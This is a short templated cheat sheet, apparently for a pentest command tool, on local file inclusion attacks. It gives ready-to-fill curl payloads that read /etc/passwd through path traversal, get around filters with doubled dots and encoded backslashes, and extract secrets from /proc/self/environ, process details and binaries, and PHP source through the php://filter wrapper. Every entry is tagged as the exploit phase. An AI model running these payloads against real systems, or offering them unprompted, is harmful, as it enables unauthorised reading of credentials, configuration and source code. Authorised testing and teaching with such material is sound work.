# LFI (Local File Inclusion)

> Reading local files via path traversal in vulnerable parameters

<!-- tags: lfi,path-traversal,web,proc -->

---

## Basic /etc/passwd Read
Test for LFI by reading /etc/passwd.

```bash
curl '{{URL:url}}?{{PARAM:str:page}}=../../../../etc/passwd'
```

<!-- meta: risk=high | phase=exploit | tags=passwd,basic -->

---

## Path Filter Bypass (Double Dot Slash)
Bypass naive `../` filters with `....//` and mixed slashes.

```bash
curl '{{URL:url}}?{{PARAM:str:page}}=....//....//etc/passwd'
```

<!-- meta: risk=high | phase=exploit | tags=bypass,filter -->

---

## URL-Encoded Backslash Bypass
Use URL-encoded backslashes to dodge string-replace based filters.

```bash
curl '{{URL:url}}?{{PARAM:str:page}}=/%5C../%5C../%5C../%5C../%5C../etc/passwd'
```

<!-- meta: risk=high | phase=exploit | tags=encoding,bypass -->

---

## Read Process Environment via /proc/self
Steal environment variables (often containing secrets) via /proc/self/environ.

```bash
curl '{{URL:url}}?{{PARAM:str:page}}=../../../../proc/self/environ'
```

<!-- meta: risk=critical | phase=exploit | tags=proc,environ,secrets -->

---

## Read Command Line via /proc/self/cmdline
Inspect the command line that started the web process.

```bash
curl '{{URL:url}}?{{PARAM:str:page}}=../../../../proc/self/cmdline'
```

<!-- meta: risk=high | phase=exploit | tags=proc,cmdline -->

---

## Read Open File Descriptor
Access open files (often config or DB files) via /proc/self/fd.

```bash
curl '{{URL:url}}?{{PARAM:str:page}}=../../../../proc/self/fd/{{FD:int:3}}'
```

<!-- meta: risk=high | phase=exploit | tags=proc,fd -->

---

## Read Application Binary
Dump the executable that started the process.

```bash
curl '{{URL:url}}?{{PARAM:str:page}}=../../../../proc/self/exe' -o {{OUTFILE:file:exe.bin}}
```

<!-- meta: risk=high | phase=exploit | tags=proc,exe,binary -->

---

## PHP Wrapper Base64 Read
Use the PHP filter wrapper to read source code as base64.

```bash
curl '{{URL:url}}?{{PARAM:str:page}}=php://filter/convert.base64-encode/resource={{TARGET_FILE:str:index.php}}'
```

<!-- meta: risk=high | phase=exploit | tags=php-wrapper,source -->
